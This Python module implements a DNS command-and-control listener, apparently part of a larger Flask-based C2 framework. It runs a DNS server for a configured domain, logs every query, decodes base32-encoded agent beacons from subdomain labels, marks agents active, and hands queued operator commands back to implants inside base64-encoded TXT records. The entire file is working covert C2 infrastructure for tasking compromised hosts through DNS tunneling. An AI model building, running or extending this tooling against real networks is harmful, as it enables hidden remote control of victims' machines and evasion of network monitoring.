"""
DNS C2 Listener — dnslib-based DNS server for DNS tunneling.

Records every DNS query as a Callback.  Supports a simple tunneling
scheme where the queried subdomain encodes C2 data using base32.

Configuration keys (extra_config):
  dns_domain      – authoritative domain, e.g. "c2.example.com"
  dns_record_type – query types to intercept: "TXT" | "A" | "CNAME" (default: TXT)
  dns_ttl         – response TTL in seconds (default: 10)
  dns_upstream    – upstream resolver for non-C2 queries (default: 8.8.8.8:53)
"""

import base64
import json
import logging
import socket
import threading
from datetime import datetime, timezone

logger = logging.getLogger(__name__)


def _utcnow():
    return datetime.now(timezone.utc)


def _decode_label(label: str) -> bytes | None:
    """Attempt base32 decode of a DNS label (add padding as needed)."""
    try:
        padded = label.upper() + "=" * (-len(label) % 8)
        return base64.b32decode(padded)
    except Exception:
        return None


class DNSListenerThread(threading.Thread):
    """UDP/TCP DNS server that serves as a C2 beacon channel."""

    def __init__(self, host: str, port: int, listener_id: int, flask_app,
                 domain: str, record_type: str, ttl: int):
        super().__init__(daemon=True, name=f"dns-listener-{listener_id}")
        self._host = host
        self._port = port
        self._listener_id = listener_id
        self._flask_app = flask_app
        self._domain = domain.lower().rstrip(".")
        self._record_type = record_type.upper()
        self._ttl = ttl
        self._stop_event = threading.Event()

    def _record_callback(self, source_ip: str, source_port: int, qname: str, qtype: str):
        """Save the DNS query to the callbacks table."""
        with self._flask_app.app_context():
            try:
                from models import db, Callback
                cb = Callback(
                    listener_id=self._listener_id,
                    source_ip=source_ip,
                    source_port=source_port,
                    hostname=None,
                    user_agent=f"DNS/{qtype}",
                    request_method="DNS",
                    request_path=f"/{qname}",
                    request_headers=json.dumps({}),
                    request_body=None,
                    timestamp=_utcnow(),
                    metadata_json=json.dumps({"qname": qname, "qtype": qtype}),
                )
                db.session.add(cb)
                db.session.commit()
            except Exception:
                logger.exception("DNS: failed to record callback")
                try:
                    from models import db
                    db.session.rollback()
                except Exception:
                    pass

    def _get_queued_tasks(self, agent_id: str) -> list[dict]:
        """Fetch and mark-as-sent queued tasks for an agent."""
        from models import db, AgentTask
        from datetime import datetime, timezone

        tasks = AgentTask.query.filter_by(
            agent_id=agent_id, status="queued"
        ).order_by(AgentTask.created_at.asc()).limit(1).all()

        result = []
        for t in tasks:
            result.append({"id": t.id, "command": t.command})
            t.status = "sent"
            t.sent_at = datetime.now(timezone.utc)
        if tasks:
            db.session.commit()
        return result

    def _build_txt_response(self, request_pkt, qname: str) -> bytes:
        """Build a DNS TXT response encoding C2 data or an empty ack."""
        from dnslib import DNSRecord, RR, QTYPE, TXT

        reply = request_pkt.reply()
        reply.header.aa = True

        # Try to extract encoded agent-id from the leftmost label
        labels = qname.rstrip(".").split(".")
        agent_id = None
        task_data = ""

        if labels:
            decoded = _decode_label(labels[0])
            if decoded:
                try:
                    msg = json.loads(decoded.decode())
                    agent_id = msg.get("id", "")[:36]
                    # Update agent last_seen
                    with self._flask_app.app_context():
                        from models import db, Agent
                        agent = Agent.query.get(agent_id)
                        if agent:
                            agent.last_seen = _utcnow()
                            agent.status = "active"
                            db.session.commit()
                            tasks = self._get_queued_tasks(agent_id)
                            if tasks:
                                task_data = base64.b64encode(
                                    json.dumps(tasks[0]).encode()
                                ).decode()
                except Exception:
                    pass

        txt_value = task_data if task_data else "ack"
        reply.add_answer(RR(qname, QTYPE.TXT, ttl=self._ttl, rdata=TXT(txt_value)))
        return reply.pack()

    def _build_a_response(self, request_pkt, qname: str) -> bytes:
        """Return a simple A record pointing back to the listener's bind address."""
        from dnslib import RR, QTYPE, A

        reply = request_pkt.reply()
        reply.header.aa = True
        # Return 127.0.0.1 as fallback — operators configure DNS routing externally
        reply.add_answer(RR(qname, QTYPE.A, ttl=self._ttl, rdata=A("127.0.0.1")))
        return reply.pack()

    def _handle_packet(self, data: bytes, addr: tuple) -> bytes | None:
        """Parse a DNS query and build an appropriate response."""
        try:
            from dnslib import DNSRecord, QTYPE

            request_pkt = DNSRecord.parse(data)
            qname = str(request_pkt.q.qname).lower().rstrip(".")
            qtype = QTYPE[request_pkt.q.qtype]

            logger.debug("DNS query %s %s from %s", qtype, qname, addr[0])
            self._record_callback(addr[0], addr[1], qname, str(qtype))

            # Only respond to queries for our domain
            if not (qname == self._domain or qname.endswith("." + self._domain)):
                return None  # let it timeout / return NXDOMAIN implicitly

            if self._record_type == "TXT":
                return self._build_txt_response(request_pkt, str(request_pkt.q.qname))
            return self._build_a_response(request_pkt, str(request_pkt.q.qname))

        except Exception:
            logger.exception("DNS: failed to handle packet from %s", addr)
            return None

    def run(self):
        """UDP accept loop."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self._host, self._port))
        sock.settimeout(1.0)
        logger.info("DNS listener %s accepting on %s:%s (domain=%s)",
                    self._listener_id, self._host, self._port, self._domain)

        while not self._stop_event.is_set():
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue
            except Exception:
                if not self._stop_event.is_set():
                    logger.exception("DNS: recvfrom error")
                break

            response = self._handle_packet(data, addr)
            if response:
                try:
                    sock.sendto(response, addr)
                except Exception:
                    logger.exception("DNS: sendto error")

        try:
            sock.close()
        except Exception:
            pass
        logger.info("DNS listener %s stopped", self._listener_id)

    def shutdown(self):
        self._stop_event.set()


def start_dns_listener(listener_row, flask_app) -> "DNSListenerThread":
    """Create and start a DNSListenerThread for *listener_row*."""
    extra: dict = {}
    try:
        extra = json.loads(listener_row.extra_config or "{}") or {}
    except (ValueError, TypeError):
        pass

    domain = extra.get("dns_domain", "c2.example.com")
    record_type = extra.get("dns_record_type", "TXT").upper()
    ttl = int(extra.get("dns_ttl", 10))

    thread = DNSListenerThread(
        host=listener_row.bind_address,
        port=listener_row.bind_port,
        listener_id=listener_row.id,
        flask_app=flask_app,
        domain=domain,
        record_type=record_type,
        ttl=ttl,
    )
    thread.start()
    return thread
